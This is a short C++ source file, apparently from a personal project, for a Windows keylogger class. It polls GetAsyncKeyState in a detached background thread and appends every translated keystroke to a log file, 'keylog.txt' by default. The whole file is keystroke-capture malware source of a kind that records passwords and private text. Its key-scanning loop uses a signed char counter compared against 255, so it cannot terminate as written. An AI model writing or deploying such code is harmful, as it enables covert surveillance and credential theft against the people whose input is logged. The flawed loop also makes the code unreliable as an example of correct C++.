//
// Created by actua on 5/21/2024.
//

#include "../include/Keylog.h"
#include <thread>
#include <windows.h>
#include "../include/FileHandler.h"

KeyLog::KeyLog(const std::string &fname = "keylog.txt") : keyHandler(fname), running(true), fileHandler(fname) {}

// Log the key to the file
void KeyLog::start() {
  // Start the thread
  std::thread logThread(&KeyLog::logLoop, this);
  // Wait for the thread to finish
  logThread.detach();
}

void KeyLog::stop() { running = false; }

void KeyLog::logLoop() {
  std::size_t lineLen = 0;
  while (running) {
    // Check each key
    for (signed char c = 8; c <= 255; c++) {
      if (GetAsyncKeyState(c) & 0x1) { // key is pressed
        std::string key = Key::translateKey(c);
        if (key.empty()) { // if there is no key press
          continue;
        }
        lineLen += key.length();
        if (lineLen >= 80) {
          fileHandler.write("\r\n");
          lineLen = 0;
        }
        fileHandler.write(key);
      }
    }
    // small delay to prevent high CPU usage and to allow the thread to be joined
    Sleep(10);
  }
}
